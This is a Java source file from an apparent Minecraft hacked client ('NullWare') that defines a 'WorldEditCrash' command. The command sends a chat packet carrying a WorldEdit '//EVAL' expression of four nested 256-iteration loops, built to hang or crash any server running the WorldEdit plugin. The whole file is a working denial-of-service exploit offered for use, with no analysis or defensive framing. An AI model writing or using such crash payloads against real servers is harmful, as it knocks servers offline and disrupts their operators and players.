package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class WorldEditCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        sendMessage("Sending WorldEdit exploit packet...");
        mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("//EVAL for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}"));
    }
}